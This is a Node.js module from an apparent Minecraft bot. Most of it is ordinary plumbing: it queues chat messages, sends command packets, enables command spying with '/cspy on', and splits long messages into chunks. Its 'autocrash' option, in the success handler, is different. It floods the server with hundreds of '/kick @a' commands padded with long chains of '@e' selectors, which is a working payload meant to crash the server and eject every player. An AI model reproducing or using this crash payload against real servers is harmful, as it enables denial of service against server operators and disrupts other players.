const index=require("../index.js")
//const fs=require("fs")
//const ba=fs.readFileSync("./ba.txt").toString()
module.exports={
        load: function(){
		
        },
	load2: function(b){
		b.chatqueue=["/cspy on"]
		b.command=function(command,hasSlash){
			if(hasSlash){
				command=command.slice(1)
			}
			b.write("chat_command",{
				command,
				timestamp: BigInt(Date.now()),
				salt: 0n,
				argumentSignatures:[],
				previousMessages:[]
			})
		}
       	        b.advancecq=function(){
			if(b.chatqueue[0] && b.chatqueue[0].length!=0){
				if(b.chatqueue[0].startsWith("/")){
					b.command(b.chatqueue[0].slice(1),false)
				} else {
//					console.log(b.id)
					b.chat(b.chatqueue[0])
				}
			}
			b.chatqueue.splice(0,1)
		}
		b.send=function(msg){
//			console.log(msg)
			const msgs=msg.match(/.{1,250}/g)
			for(let i in msgs){
//				console.log(123)
				b.chatqueue.push(msgs[i])
			}
		}
		b.on("success",function(){
			if(b.o.autocrash){
				for(let i=0;i<=8;i++){
					for(let j=0;j<=8;j++){
						for(let k=0;k<=8;k++){
							b.send("/kick @a @e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e")
						}
					}
				}
			}
			console.log("success packet")//ba.split("\n")
			//b.cqa=Function("index.p.advancecq()")//"+i+"
			setTimeout(()=>{b.cqi=setInterval(b.advancecq,260)},2240) //adds up to 2500
		})
	}
}
